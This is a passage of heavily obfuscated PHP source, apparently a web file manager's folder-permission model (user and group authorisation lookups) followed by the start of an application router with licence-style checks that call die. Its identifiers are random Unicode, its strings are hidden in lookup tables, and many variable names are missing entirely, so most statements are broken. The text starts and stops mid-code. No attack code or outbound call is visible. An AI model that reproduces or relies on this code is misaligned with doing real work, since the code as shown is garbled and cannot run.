== 0) { $[$ҙ[188]] = SourceModel::TYPE_USER; } $߂[] = array($ҙ[191] => $, $ҙ[188] => intval($[$ҙ[188]]), $ҙ[589] => intval($[$ҙ[589]]), $ҙ[1641] => intval($[$ҙ[1641]]) ? intval($[$ҙ[1641]]) : 0, $ҙ[2345] => intval($[$ҙ[2345]]) ? intval($[$ҙ[2345]]) : -1); } $this->where(array($ҙ[506] => $))->delete(); $this->addAll($߂); return !0; } public function authClear($) { $ =& $_SERVER[ܮ]; $ЛЕ = Model($[1534])->sourceInfo($); $䀚Ō = array($); if ($ЛЕ[$[500]] == $[91]) { $ۦج = array($[674] => array($[635], $ЛЕ[$[604]] . $ . $[636])); $䀚Ō = Model($[1534])->field($[506])->where($ۦج)->getField($[191], !0); $䀚Ō[] = $; } $this->where(array($[506] => array($[507], $䀚Ō)))->delete(); return !0; } public function getAllParent($ǎߤ) { $ٛ՚ =& $_SERVER[ܮ]; $ = Model($ٛ՚[1534])->sourceInfo($ǎߤ); if (!$ || $[$ٛ՚[188]] != SourceModel::TYPE_GROUP) { return array(); } $Ȧ = Model($ٛ՚[1534])->parentLevelArray($[$ٛ՚[604]]); $ٜ = array_merge(array(intval($ǎߤ)), array_reverse($Ȧ)); $Ԣ = $this->sourceAuthSelect($ٜ); $ҳ = $GLOBALS[$ٛ՚[6]][$ٛ՚[92]][$ٛ՚[2289]] == 1; $ = $ҳ ? 3 : 2; $ґ = Model($ٛ՚[1494])->getInfo($[$ٛ՚[589]]); $ɝ = explode($ٛ՚[50], trim($ґ[$ٛ՚[604]], $ٛ՚[50])); $ = array_merge(array($ґ[$ٛ՚[1496]]), array_reverse(array_slice($ɝ, $))); foreach ($Ԣ as $ǎߤ => $ש) { foreach ($ש as $Ι) { if (!$Ι || !$Ι[$ٛ՚[589]] || $Ι[$ٛ՚[589]] == $ٛ՚[228]) { continue; } if ($Ι[$ٛ՚[188]] != SourceModel::TYPE_GROUP) { continue; } $[] = $Ι[$ٛ՚[589]]; } } $ = array_unique($); $ŋ = array($ٛ՚[428] => _get($GLOBALS[$ٛ՚[7]], $ٛ՚[428], 1), $ٛ՚[439] => _get($GLOBALS[$ٛ՚[7]], $ٛ՚[439], 500)); $GLOBALS[$ٛ՚[7]][$ٛ՚[428]] = 1; $GLOBALS[$ٛ՚[7]][$ٛ՚[439]] = 500; $ȅ = array($ٛ՚[508] => 0, $ٛ՚[2188] => AuthModel::authAll(), $ٛ՚[509] => LNG($ٛ՚[2368]), $ٛ՚[2203] => $ٛ՚[2369]); $根 = array(); $ = explode($ٛ՚[50], $ٛ՚[2370]); $ӽ華 = explode($ٛ՚[50], $ٛ՚[2371]); foreach ($ as $) { $ = Model($ٛ՚[1494])->getInfo($); $ = array_field_key($, $); $혲ީ = Model($ٛ՚[617])->listByGroup($); foreach ($혲ީ[$ٛ՚[446]] as $ => $ϣ) { $this->userGroupList($ϣ[$ٛ՚[1593]], $ϣ); $薯 = $ϣ[$ٛ՚[1593]] . $ٛ՚[12]; if (isset($根[$薯])) { continue; } $ַ = Model($ٛ՚[2372])->listData($ϣ[$ٛ՚[2373]]); $ϣ[$ٛ՚[2374]] = Action($ٛ՚[2375])->parseUrl($ϣ[$ٛ՚[2374]]); $ϣ[$ٛ՚[1942]] = $ַ && $ַ[$ٛ՚[2376]] == 1; $ = $this->groupRootAuth($, $ϣ[$ٛ՚[1593]]); $ = $ϣ[$ٛ՚[1942]] ? $ȅ : $; $根[$薯] = array($ٛ՚[2377] => $ٛ՚[2378], $ٛ՚[2379] => LNG($ٛ՚[2380]), $ٛ՚[2357] => array_field_key($ϣ, $ӽ華), $ٛ՚[502] => $, $ٛ՚[503] => $[$ٛ՚[502]], $ٛ՚[2381] => $); } } $GLOBALS[$ٛ՚[7]][$ٛ՚[428]] = $ŋ[$ٛ՚[428]]; $GLOBALS[$ٛ՚[7]][$ٛ՚[439]] = $ŋ[$ٛ՚[439]]; foreach ($Ԣ as $ǎߤ => $ש) { if (!$ש) { continue; } foreach ($ש as $Ι) { if (!$Ι || !$Ι[$ٛ՚[589]] || $Ι[$ٛ՚[589]] == $ٛ՚[228]) { continue; } if ($Ι[$ٛ՚[188]] != SourceModel::TYPE_USER) { continue; } $薯 = $Ι[$ٛ՚[589]] . $ٛ՚[12]; if (isset($根[$薯])) { continue; } $ɤ = $this->authMake($ש, $薯); if (!$ɤ || !$ɤ[$ٛ՚[2379]]) { continue; } $根[$薯] = array($ٛ՚[2377] => $ٛ՚[2382], $ٛ՚[2379] => $ɤ[$ٛ՚[2379]], $ٛ՚[2357] => Model($ٛ՚[617])->getInfoSimpleOuter($薯), $ٛ՚[502] => $ɤ[$ٛ՚[556]], $ٛ՚[503] => $ɤ[$ٛ՚[556]][$ٛ՚[502]], $ٛ՚[2381] => $ɤ[$ٛ՚[2383]]); } } foreach ($Ԣ as $ǎߤ => $ש) { if (!$ש) { continue; } foreach ($根 as $薯 => $) { if ($[$ٛ՚[2357]][$ٛ՚[1942]] || $[$ٛ՚[2377]] == $ٛ՚[2382]) { continue; } $ɤ = $this->authMake($ש, $薯); if (!$ɤ || !$ɤ[$ٛ՚[2379]]) { continue; } $根[$薯] = array($ٛ՚[2377] => $ٛ՚[2382], $ٛ՚[2379] => $ɤ[$ٛ՚[2379]], $ٛ՚[2357] => $[$ٛ՚[2357]], $ٛ՚[502] => $ɤ[$ٛ՚[556]], $ٛ՚[503] => $ɤ[$ٛ՚[556]][$ٛ՚[502]], $ٛ՚[2381] => $ɤ[$ٛ՚[2383]]); } } $根 = array_sort_by($根, $ٛ՚[503], $ٛ՚[540]); return $根; } public function getAllChildren($²) { $ׁ܌ =& $_SERVER[ܮ]; $Ǖ = Model($ׁ܌[1534])->sourceInfo($²); if ($Ǖ[$ׁ܌[500]] != $ׁ܌[91]) { return $this->sourceListAuth(array($²)); } if ($Ǖ[$ׁ܌[188]] != SourceModel::TYPE_GROUP) { return array(); } $ډ = 1; $ຩ = array($²); if ($Ǖ[$ׁ܌[190]] == $ׁ܌[228] && $Ǖ[$ׁ܌[589]] != $ډ) { $ຩ = $this->groupChidldAllRootSource($Ǖ[$ׁ܌[589]]); } $ = $this->field($ׁ܌[191])->group($ׁ܌[191])->select(); $ = array_to_keyvalue($, $ׁ܌[12], $ׁ܌[191]); if (!$) { return array(); } $֣ = $ׁ܌[2384]; $㈙ = array($ׁ܌[191] => array($ׁ܌[7], $), $ׁ܌[520] => $ׁ܌[228]); $ = Model($ׁ܌[939])->field($֣)->where($㈙)->select(); $ = array($²); foreach ($ as $纰) { foreach ($ຩ as $) { $ = $ׁ܌[50] . $ . $ׁ܌[50]; $ = $纰[$ׁ܌[604]] . $纰[$ׁ܌[191]] . $ׁ܌[50]; if (strstr($, $)) { $[] = $纰[$ׁ܌[191]]; break; } } } return $this->sourceListAuth($); } private function sourceListAuth($ˬ̏) { $ =& $_SERVER[ܮ]; $Ꮛ = Model($[1534])->sourceListInfo($ˬ̏, !0); $ = $this->sourceAuthSelect($ˬ̏); $͔ = array(); $싺 = array(); foreach ($Ꮛ as $ʾ) { unset($ʾ[$[543]]); unset($ʾ[$[541]]); unset($ʾ[$[502]]); unset($ʾ[$[90]]); $ = $[$ʾ[$[191]]]; if (!$) { continue; } $ʾ[$[2381]] = $this->authTargetInfo($); $ʾ[$[602]] = rtrim($ʾ[$[608]], $[8]) . $[8] . ltrim($ʾ[$[602]], $[8]); $͔[] = $ʾ; $ = count(explode($[8], trim($ʾ[$[602]], $[8]))); $싺[] = $ + ($ʾ[$[33]] == $[78] ? 0 : 1000); } array_multisort($싺, SORT_ASC, $͔); return $͔; } private function groupChidldAllRootSource($ڜ) { $֤ =& $_SERVER[ܮ]; $ո = Model($֤[1494])->groupChildrenAll($ڜ); $䍂ꉈ = array($֤[190] => 0, $֤[589] => array($֤[7], $ո), $֤[188] => SourceModel::TYPE_GROUP); $₣ = Model($֤[939])->field($֤[191])->where($䍂ꉈ)->select(); $₣ = array_to_keyvalue($₣, $֤[12], $֤[191]); return $₣; } private function authTargetInfo($) { $ۤ =& $_SERVER[ܮ]; $ = array(); $Ū = array(); $ٿ = 2 << 25; foreach ($ as $) { $爟ʧ = Model($ۤ[591])->listData($[$ۤ[1641]]); if (!$爟ʧ) { continue; } if ($[$ۤ[188]] == SourceModel::TYPE_USER) { $݈ = Model($ۤ[597])->getInfoSimpleOuter($[$ۤ[589]]); if ($݈[$ۤ[1593]] == $ۤ[1381]) { continue; } if ($݈[$ۤ[1593]] == $ۤ[228]) { $݈[$ۤ[32]] = LNG($ۤ[2385]); } } else { $݈ = Model($ۤ[605])->getInfoSimple($[$ۤ[589]]); } if (!$݈) { continue; } $݈[$ۤ[556]] = $爟ʧ; $[] = $݈; $􌑺 = 0; if ($[$ۤ[188]] == SourceModel::TYPE_GROUP) { $􌑺 = $ٿ * 2; } if ($[$ۤ[188]] == SourceModel::TYPE_USER) { $􌑺 = $ٿ; } if ($[$ۤ[188]] == SourceModel::TYPE_USER && $[$ۤ[589]] == $ۤ[228]) { $􌑺 = 0; } $Ū[] = $爟ʧ[$ۤ[502]] + $􌑺; } array_multisort($Ū, SORT_DESC, $); return $; } public function getAllChildrenByUser($̫, $) { $݈Ǧ =& $_SERVER[ܮ]; $ = Model($݈Ǧ[617])->getInfo($); if (!$ || !$̫ || !$) { return array(); } $ = Model($݈Ǧ[1534])->sourceInfo($̫); $ƛ = array(); $ן = 1; if ($[$݈Ǧ[190]] == $݈Ǧ[228] && $[$݈Ǧ[589]] != $ן && $this->groupContainUser($[$݈Ǧ[589]], $)) { foreach ($[$݈Ǧ[1495]] as $웢) { $Ж = Model($݈Ǧ[605])->getInfo($웢[$݈Ǧ[1496]]); $Ƹ = Model($݈Ǧ[617])->getInfoSimpleOuter($); $Ƹ[$݈Ǧ[556]] = $웢[$݈Ǧ[502]]; if (Model($݈Ǧ[591])->authCheckAction($웢[$݈Ǧ[502]][$݈Ǧ[502]], $݈Ǧ[1565])) { continue; } $寲 = array($݈Ǧ[32] => $݈Ǧ[1399] . $Ж[$݈Ǧ[32]], $݈Ǧ[191] => $Ж[$݈Ǧ[90]][$݈Ǧ[191]], $݈Ǧ[87] => KodIO::make($Ж[$݈Ǧ[90]][$݈Ǧ[191]]), $݈Ǧ[190] => $݈Ǧ[228], $݈Ǧ[188] => $݈Ǧ[598], $݈Ǧ[33] => $݈Ǧ[639], $݈Ǧ[602] => $Ж[$݈Ǧ[609]], $݈Ǧ[1496] => $Ж[$݈Ǧ[1496]], $݈Ǧ[606] => $Ж[$݈Ǧ[190]], $݈Ǧ[2381] => array($Ƹ)); $ƛ[$寲[$݈Ǧ[191]]] = $寲; } } $ = array(); $ = $this->getAllChildren($̫); foreach ($ as $ʼ) { $ = !1; foreach ($ʼ[$݈Ǧ[2381]] as $) { if ($[$݈Ǧ[1593]]) { if ($[$݈Ǧ[1593]] == $) { $ = !0; break; } } if ($[$݈Ǧ[1496]]) { if ($this->groupContainUser($[$݈Ǧ[1496]], $)) { $ = !0; break; } } } if ($) { $[] = $ʼ; } $܇۩ = $ʼ[$݈Ǧ[191]]; if (isset($ƛ[$܇۩])) { $ʼ[$݈Ǧ[2381]][] = $ƛ[$܇۩][0]; $ƛ[$܇۩] = !1; } } $ƛ = array_filter(array_values($ƛ)); $ = array_merge($ƛ, $); return $; } public function setAllChildrenByUser($˙, $, $ݼ) { $ =& $_SERVER[ܮ]; $ = $this->getAllChildrenByUser($˙, $); if (!$ݼ || !$) { return !1; } foreach ($ as $ԟ) { $ƺ = array(); foreach ($ԟ[$[2381]] as $䈾) { $ = $䈾[$[556]]; $ = $䈾[$[1593]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ħ = $䈾[$[1593]] ? $䈾[$[1593]] : $䈾[$[1496]]; if ($䈾[$[1593]] && $䈾[$[1593]] == $) { continue; } $ƺ[] = array($[191] => $ԟ[$[191]], $[188] => $, $[589] => intval($ħ), $[1641] => isset($[$[487]]) ? intval($[$[487]]) : 0, $[2345] => isset($[$[2345]]) ? intval($[$[2345]]) : -1); } $ƺ[] = array($[191] => $ԟ[$[191]], $[188] => SourceModel::TYPE_USER, $[589] => intval($), $[1641] => intval($ݼ), $[2345] => -1); $this->where(array($[506] => $ԟ[$[191]]))->delete(); $this->addAll($ƺ); } return !0; } public function get($) { $Ë = $this->getSourceList(array($), !0); return $Ë[0]; } public function getSourceList($, $ = false, $ = false) { $ =& $_SERVER[ܮ]; if (!$) { return array(); } $ = Model($[1534]); if (!$ && count($) == 1) { $ = array(); $[$[0]] = $->sourceInfo($[0]); } if (!$) { $թ = array($[506] => array($[507], $)); $ = $->field($[2386])->where($թ)->select(); $ = array_to_keyvalue($, $[191]); } $ڄ = $; foreach ($ as $֓ => $ڹ) { $ݍױ = $->parentLevelArray($ڹ[$[604]]); $ڄ = array_merge($ڄ, array(intval($֓)), array_reverse($ݍױ)); } $ڄ = array_values(array_unique($ڄ)); if (!$ڄ) { return array(); } $Υ = $this->sourceAuthSelect($ڄ); $ٞ = array(); foreach ($ڄ as $٧֛) { if (isset($Υ[$٧֛])) { $ٞ[$٧֛] = $Υ[$٧֛]; } } $Ԧɛ = $this->userIsRoot($); $ۄ = AuthModel::authAll(); $ߡ = array($[503] => $ۄ, $[2387] => array($[508] => 0, $[2188] => $ۄ, $[509] => LNG($[2368]), $[2203] => $[2369])); $ = array(); foreach ($ as $٧֛ => $ύ) { if ($Ԧɛ && $GLOBALS[$[6]][$[2201]]) { $[$٧֛] = $ߡ; continue; } $[$٧֛] = $this->makeSourceAuth($ύ, $ٞ, $); } return $; } public function authDeepCheck($, $ = false) { $ =& $_SERVER[ܮ]; $ = $ ? $ : USER_ID; $ٽ = $this->makeAuthDeep($); if (!in_array($, $ٽ[$[2388]])) { return !1; } $Υ = array(); foreach ($ٽ[$[2389]] as $ => $ǘ،) { if (!in_array($, $ǘ،)) { continue; } $Υ[] = $; } if (!$Υ) { return !1; } $î = $Υ ? $Υ[0] : $; return array($[503] => -1, $[556] => array($[508] => $[1381], $[2188] => $[228], $[509] => LNG($[2390]), $[2203] => $[2391]), $[2379] => LNG($[2392]), $[2393] => $this->sourceAuthInfo($î)); } protected function makeAuthDeep($ೣ = false) { $ =& $_SERVER[ܮ]; static $ɜ = array(); $ೣ = $ೣ ? $ೣ : USER_ID; if (isset($ɜ[$ೣ])) { return $ɜ[$ೣ]; } $󧇅 = Model($[2394])->listData(); $ = array(); foreach ($󧇅 as $) { if ($[$[502]] == 0 && $[$[2202]] == $[91]) { $[] = $[$[487]]; } } $ڝ = $this->userGroupParents($ೣ); $ = array($[188] => SourceModel::TYPE_USER, $[589] => $ೣ); if ($ڝ) { $ = array(array($[188] => SourceModel::TYPE_USER, $[589] => $ೣ), array($[188] => SourceModel::TYPE_GROUP, $[589] => array($[507], $ڝ)), $[1168] => $[2284]); } $Β = $this->field($[2395])->where($)->select(); $ = array(); $֬ = array_to_keyvalue_group($Β, $[191]); foreach ($֬ as $ => $ݲ) { $Ȉ = $this->authArrayCheck($ݲ, $ೣ); if ($Ȉ[$[503]] > 0) { $[] = $ . $[12]; } } if ($ڝ) { $怕 = Model($[605]); foreach ($ڝ as $ώҒ) { $ = $怕->getInfo($ώҒ); if (!$ || !is_array($[$[90]])) { continue; } $[] = $[$[90]][$[191]]; } } $Ǻ = array(); $ϙ = $ڝ; $╕ = Model($[1534]); $怕 = Model($[605]); $ = array(); $Շ = array(); $ = array(); $ = array(); if ($) { $ҭ = $╕->where(array($[191] => array($[507], $)))->select(); foreach ($ҭ as $) { if ($[$[520]] == $[91]) { continue; } $ = $╕->parentLevelArray($[$[604]]); $Ǻ = array_merge($Ǻ, $); $ϙ[] = $[$[589]]; $[$[$[191]]] = $; $Շ[$[$[191]]] = $[$[589]]; } } $ϙ = array_values(array_unique($ϙ)); $ = $ϙ; foreach ($ as $ώҒ) { $ = $怕->getInfo($ώҒ); $ = $╕->parentLevelArray($[$[604]]); $ϙ = array_merge($ϙ, $); } $ϙ = array_values(array_unique($ϙ)); foreach ($ϙ as $ώҒ) { $ = $怕->getInfo($ώҒ); $Ǻ[] = $[$[90]][$[191]]; $[$ώҒ] = $[$[90]][$[191]]; $[$ώҒ] = $╕->parentLevelArray($[$[604]]); } foreach ($ as $ => $) { $С܌ = $Շ[$]; if (!$С܌ || !$[$С܌]) { continue; } $ = array(); foreach ($[$С܌] as $ώҒ) { $[] = $[$ώҒ]; } $[$] = array_merge($, $); } $Ǻ = array_values(array_unique($Ǻ)); $ = array($[2388] => $Ǻ, $[2389] => $); $ɜ[$ೣ] = $; return $; } private function makeSourceAuth($亘, $鑻, $Փ = false) { $ =& $_SERVER[ܮ]; $ų = $[91]; $ = $亘[$[589]]; $ = $亘[$[188]] == SourceModel::TYPE_GROUP; $ŏ = $ ? $this->groupRootAuth($, $Փ) : !1; if ($ŏ && Model($[591])->authCheckAction($ŏ[$[502]], $[1565])) { return $this->groupAuthInfo($ŏ, $); } $ = Model($[1534])->parentLevelArray($亘[$[604]]); $ = array_merge(array($亘[$[191]]), array_reverse($)); $퍠 = !1; foreach ($ as $ʁ) { if (!isset($鑻[$ʁ])) { continue; } $ = $this->authMake($鑻[$ʁ], $Փ); if ($[$[556]]) { $퍠 = $; break; } } if (!$) { return $퍠; } if (!$퍠 && $ŏ) { $퍠 = $this->groupAuthInfo($ŏ, $); } if (!$퍠) { $ = Model($[605])->getInfo($); $ɓ = explode($[50], trim($[$[604]], $[50])); $ɓ = array_reverse($ɓ); foreach ($ɓ as $Ծτ) { if ($Ծτ == $[228] || $Ծτ == $ų) { continue; } $Ɇ = $this->groupRootAuth($Ծτ, $Փ); if (!$Ɇ) { continue; } $퍠 = $this->groupAuthInfo($Ɇ, $Ծτ); break; } } if (!$퍠 || $퍠[$[503]] <= 0) { $Ҕ = $this->authDeepCheck($亘[$[191]], $Փ); if ($Ҕ) { $퍠 = $Ҕ; } } return $퍠; } private function userIsRoot($̤ܸϾ = false) { $߅ =& $_SERVER[ܮ]; if (!$̤ܸϾ && KodUser::isRoot()) { return !0; } $ט = Model($߅[617])->getInfo($̤ܸϾ); $ = Model($߅[2372])->listData($ט[$߅[2373]]); if ($ && $[$߅[595]][$߅[2376]] == 1) { return !0; } return !1; } private function sourceAuthInfo($٣) { $¼ =& $_SERVER[ܮ]; $ӛ = Model($¼[1534]); $ܴ = $ӛ->sourceInfo($٣); if (!$ܴ) { return !1; } $ӛ->groupPathDisplay($ܴ); $֩˼ = array($ܴ); $֩˼ = $ӛ->_listAppendPath($֩˼, !1); $ܴ = $֩˼[0]; $ = $ܴ[$¼[602]]; if (isset($ܴ[$¼[610]])) { $և聇 = explode($¼[8], trim($ܴ[$¼[602]], $¼[8])); array_shift($և聇); $ = $ܴ[$¼[608]] . $¼[2396] . implode($¼[8], $և聇); } return array($¼[32] => $ܴ[$¼[32]], $¼[191] => $ܴ[$¼[191]], $¼[87] => KodIO::make($ܴ[$¼[191]]), $¼[602] => $); } private function groupAuthInfo($ʒ, $˧) { $ =& $_SERVER[ܮ]; $ċ̽ = Model($[605])->getInfo($˧); return array($[2397] => intval($ʒ[$[502]]), $[2387] => $ʒ, $[2398] => LNG($[2399]), $[2393] => array($[509] => $ċ̽[$[32]], $[87] => KodIO::make($ċ̽[$[90]][$[191]]), $[2400] => $ċ̽[$[609]])); } protected function groupRootAuth($, $ = false) { $ =& $_SERVER[ܮ]; $ = $ ? $ : USER_ID; $؃ = $ . $[2401] . $; static $ = array(); if (isset($[$؃])) { return $[$؃]; } $ޖ = Model($[605])->getInfo($); $ַ = $this->userGroupList($); $ʏ = isset($ַ[$]) ? $ַ[$][$[502]] : !1; if ($ʏ && Model($[591])->authCheckAction($ʏ[$[502]], $[1565])) { $[$؃] = $ʏ; return $ʏ; } $ȴ = $this->sourceAuthSelect($ޖ[$[90]][$[191]]); $Єݟ = $ȴ ? $this->authMake($ȴ, $) : !1; $ύ = $Єݟ ? $Єݟ[$[556]] : !1; $[$؃] = $ύ ? $ύ : $ʏ; return $[$؃]; } public function authOwnerApply($𮜡) { $ =& $_SERVER[ܮ]; if (empty($𮜡[$[502]]) || isset($𮜡[$[1584]]) && $𮜡[$[1584]]) { return $𮜡; } if (AuthModel::authCheckRoot($𮜡[$[502]][$[503]])) { return $𮜡; } $ = Model($[1534])->parentLevelArray($𮜡[$[604]]); $ = array_merge(array($𮜡[$[191]]), array_reverse($)); $ڈϬ = $this->sourceAuthSelect($); $ߥ = array(); $Ņ = array(); foreach ($ڈϬ as $ه۶ => $􇞭) { $ = $this->authFolderOwnerUser($􇞭); $ߥ[$ه۶] = $; $Ņ = array_merge($Ņ, $[$[684]]); if ($[$[2402]]) { break; } } if (count($Ņ) == 0) { $Ņ = $this->authFolderOwnerGroup($𮜡[$[589]]); } $Ņ = array_unique($Ņ); if (AuthModel::authCheckRoot($𮜡[$[502]][$[503]])) { $Ņ[] = USER_ID; } $𮜡[$[502]][$[2403]] = Model($[597])->userListInfo($Ņ); return $𮜡; } private function authFolderOwnerGroup($) { $ =& $_SERVER[ܮ]; $־ = Model($[2276])->where(array($[1496] => $))->select(); $勿 = array(); if (!$־) { return $勿; } foreach ($־ as $җ) { $ = $this->authInfo($җ); if (AuthModel::authCheckRoot($[$[502]])) { $勿[] = $җ[$[1593]]; } } return $勿; } private function authFolderOwnerUser($瀲ê) { $؏ =& $_SERVER[ܮ]; $͌ = array(); $ = !1; foreach ($瀲ê as $Ե) { $ǔ݊ = $this->authInfo($Ե); if ($Ե[$؏[589]] == $؏[228]) { $ = !0; } if ($Ե[$؏[188]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($ǔ݊[$؏[502]])) { $͌[] = $Ե[$؏[589]]; } } } return array($؏[684] => $͌, $؏[2402] => $); } public function authMake($м, $ۍ = false) { $´ϭ =& $_SERVER[ܮ]; $ = $this->authArrayCheck($м, $ۍ); if ($[$´ϭ[2383]]) { $[$´ϭ[2383]] = $this->sourceAuthInfo($[$´ϭ[2383]]); } return $; } public function authArrayCheck($ښǩ, $ݙ = false) { $ =& $_SERVER[ܮ]; if (!$ښǩ) { return array($[503] => 0, $[556] => !1, $[2398] => $[12]); } $ݙ = $ݙ ? $ݙ : USER_ID; $ذ = 0; $ = 0; $ = 0; $ = 0; $â = 0; $헼 = 0; $ = 0; $״ = 0; $閖 = 1000; $ϲ͐ = 0; $ = 0; $޹ = 0; $ = 0; $ = 0; foreach ($ښǩ as $) { $ = $this->authInfo($); if (!$) { continue; } $ڸ = $[$[589]]; $ȇ = $[$[191]]; $읹 = intval($[$[502]]); if ($[$[188]] == SourceModel::TYPE_USER && $ڸ == $ݙ) { $ذ = !0; $ = $; $ = $읹; $ = $ȇ; } else { if ($[$[188]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ڸ, $ݙ)) { $â = !0; $ģ = $this->groupStepToUserGroup($ڸ, $ݙ); if ($ģ < $閖) { $閖 = $ģ; $헼 = $읹; $ = $; $ϲ͐ = $ڸ; $״ = $ȇ; } if ($ģ == $閖 && $읹 >= $헼) { $헼 = $읹; $ = $; $ϲ͐ = $ڸ; $״ = $ȇ; } } else { if (!$ڸ || $ڸ == $[228]) { $ = !0; $ = $; $޹ = $읹; $ = $ȇ; } } } } if ($ذ) { $ = $; $ = $; $庚 = $; $Ք = LNG($[2404]); } else { if ($â) { $ = $헼; $ = $; $庚 = $״; $ = Model($[605])->getInfo($ϲ͐); $Ք = $[173] . $[$[609]] . $[2405] . LNG($[2406]); } else { if ($) { $ = $޹; $ = $; $庚 = $; $Ք = LNG($[2385]); } else { $ = 0; $ = !1; $Ք = $[12]; $庚 = $[12]; } } } $ᆅ = array($[2397] => intval($), $[2387] => $, $[2398] => $Ք, $[2393] => $庚); return $ᆅ; } private function groupContainUser($, $ʴ⺅ = false) { return in_array($, $this->userGroupParents($ʴ⺅)); } private function groupStepToUserGroup($, $ = false) { $̲ =& $_SERVER[ܮ]; $¢ = $this->userGroupList($); $ = 1000; $ز = $GLOBALS[$̲[6]][$̲[92]][$̲[2289]] == 1; $ = $ز ? 3 : 2; foreach ($¢ as $) { if ($[$̲[1496]] == $) { return 0; } $㜗 = explode($̲[50], trim($[$̲[604]], $̲[50])); if ($㜗[0] == $̲[228] && count($㜗) > $) { $ع = array_reverse(array_slice($㜗, $)); $ɶ = array_search($, $ع); if ($ɶ !== !1 && $ɶ + 1 <= $) { $ = $ɶ + 1; } } } return $; } private function userGroupList($ = false, $ = false) { $ =& $_SERVER[ܮ]; static $ض = array(); if (isset($ض[$])) { return $ض[$]; } if (!$) { $ = Model($[617])->getInfo($); } $ض[$] = array_to_keyvalue($[$[1495]], $[1496]); return $ض[$]; } public function userGroupParents($ʛ) { $Ӳ㘛 =& $_SERVER[ܮ]; static $ـ = array(); $ʛ = $ʛ ? $ʛ : USER_ID; if (isset($ـ[$ʛ])) { return $ـ[$ʛ]; } $ = $this->userGroupList($ʛ); $ܼ = array(); $ = $GLOBALS[$Ӳ㘛[6]][$Ӳ㘛[92]][$Ӳ㘛[2289]] == 1; $ = $ ? 3 : 2; foreach ($ as $Ե) { $Ь = array($Ե[$Ӳ㘛[1496]]); $ػҘ = explode($Ӳ㘛[50], trim($Ե[$Ӳ㘛[604]], $Ӳ㘛[50])); if ($ػҘ[0] == $Ӳ㘛[228] && count($ػҘ) > $) { $ = array_slice($ػҘ, $); $Ь = array_merge($Ь, array_reverse($)); } $ܼ = array_merge($ܼ, $Ь); } $ـ[$ʛ] = array_unique($ܼ); return $ـ[$ʛ]; } public function authTargetInfoMake($) { $ =& $_SERVER[ܮ]; $ = array(); $ = array(); foreach ($ as $〗) { if ($〗[$[188]] == SourceModel::TYPE_USER) { $[] = intval($〗[$[589]]); } else { if ($〗[$[188]] == SourceModel::TYPE_GROUP) { $[] = intval($〗[$[589]]); } } } if ($) { $ = Model($[597])->userListInfo($); } if ($) { $Ѧ = array($[2269] => array($[507], $)); $ = Model($[605])->field($[2407])->where($Ѧ)->select(); $ = array_to_keyvalue($, $[1496]); } return array($[2408] => $, $[2409] => $); } public function authInfo($䡪) { $Ԧ =& $_SERVER[ܮ]; if ($䡪[$Ԧ[1641]]) { $Խ = Model($Ԧ[591])->listData($䡪[$Ԧ[1641]]); if (!$Խ) { return !1; $␘ = Model($Ԧ[591])->listData(); $ڻ = array_filter_by_field($␘, $Ԧ[502], $Ԧ[228]); return $ڻ; } $׈ = array_field_key($Խ, array($Ԧ[487], $Ԧ[32], $Ԧ[502], $Ԧ[2203], $Ԧ[2204])); $׈[$Ԧ[2410]] = $䡪; return $׈; } else { return array($Ԧ[508] => 0, $Ԧ[2188] => $䡪[$Ԧ[2345]], $Ԧ[509] => $Ԧ[12], $Ԧ[2203] => $Ԧ[2411]); } } } goto Cꩃߪ; Fϙ: class Application { private $defaultModule = "\x69\156\144\145\170"; private $defaultController = "\x69\x6e\144\x65\170"; private $defaultAction = "\x69\x6e\144\145\170"; function __construct() { } public function setDefault($) { $ =& $_SERVER[ܮ]; $ =& $_SERVER[Ĵ]; $ = explode($[0], trim($, $[0])); $this->defaultModule = $[0] ? $[0] : $this->defaultModule; $this->defaultController = $[1] ? $[1] : $this->defaultController; $this->defaultAction = $[2] ? $[2] : $this->defaultAction; $Չӭ = $[706]; if (strlen($Չӭ) < $[707]) { return; } $this->cveb8132e0c3($[1], array($this, $[2])); } public function appRun($ᰑո) { $ۭ =& $_SERVER[ܮ]; $دߧ =& $_SERVER[Ĵ]; $ţ = explode($دߧ[0], $ᰑո); $Ə = $ۭ[708]; if (!$Ə) { die; } $٘ = strtolower($ţ[0]); $懃۞ = $ۭ[709]; if (!$懃۞) { die; } $܋ = $دߧ[3]; $ўˮ = $ۭ[710]; if (!$ўˮ) { return; } if ($٘ == $دߧ[4]) { $܋ = $دߧ[5]; $ţ[0] = $دߧ[6]; $ţ[1] = $ţ[1] . $دߧ[7]; $ᰑո = join($دߧ[0], $ţ); $ᰑո = trim($ᰑո, $دߧ[0]); } call_user_func(array($دߧ[8], $دߧ[9]), $܋ . $دߧ[10], $ᰑո); ActionCall($ᰑո); call_user_func(array($دߧ[8], $دߧ[9]), $܋ . $دߧ[11], $ᰑո); $ޱ҈ = $ۭ[711]; } private function autorun() { $ƻۓ =& $_SERVER[Ĵ]; global $config; if (count($config[$ƻۓ[12]]) == 0) { return; } foreach ($config[$ƻۓ[12]] as $ => $) { $this->appRun($); } } private function gpoze8c1edf5() { $ȿ =& $_SERVER[ܮ]; $ =& $_SERVER[Ĵ]; $ޚݳ = $[4]; $ = $ȿ[712]; if (strlen($) < $ȿ[713]) { die; } $ه = $GLOBALS[$[13]][$[14]][0]; if (!$ه || strlen($ه) <= strlen($ޚݳ)) { return; } if (strtolower(substr($ه, -strlen($ޚݳ))) != $ޚݳ) { return; } $ط = substr($ه, 0, -strlen($ޚݳ)); $ރ = array($[4], $ط); $եО = array_slice($GLOBALS[$[13]][$[14]], 1); $GLOBALS[$[13]][$[14]] = array_merge($ރ, $եО); $ = $ȿ[714]; while ($ < $ȿ[715]) { if ($ >= 0) { break; } $++; } $GLOBALS[$[13]][$[15]] = implode($[0], $GLOBALS[$[13]][$[14]]); } private function usji257bf8e3() { $騣 =& $_SERVER[ܮ]; $恨 =& $_SERVER[Ĵ]; if ($GLOBALS[$恨[13]][$恨[15]] != $恨[6]) { return; } $я = $_SERVER[$恨[16]]; $ = $騣[716]; $桁 = $恨[17]; $ = $騣[717]; if (!$) { die; } if (!strstr($я, $桁)) { return; } $˚ = strrpos($я, $桁); $򏗙 = substr($я, $˚ + strlen($桁)); $Ã = $騣[718]; preg_match_all($恨[18], $򏗙, $ٝ); $ = $騣[719]; $򏗙 = trim($ٝ[0][0], $恨[19]); $Ƌ = $騣[720]; 